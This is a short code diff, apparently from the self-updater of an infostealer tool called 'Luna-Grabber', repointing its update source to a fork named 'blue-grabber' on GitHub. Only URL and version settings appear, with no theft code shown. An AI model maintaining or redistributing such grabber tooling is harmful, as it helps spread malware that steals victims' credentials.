@@ -8,7 +8,7 @@ import requests
 class Update():
     def __init__(self):
         self.version = '1.5.5'
-        self.github = 'https://raw.githubusercontent.com/Smug246/Luna-Grabber/main/tools/update.py'
+        self.github = 'https://raw.githubusercontent.com/comuserra/blue-grabber/main/tools/update.py'
         self.zipfile = 'https://codeload.github.com/comuserra/blue-grabber/zip/refs/heads/main'
         self.update_checker()
 
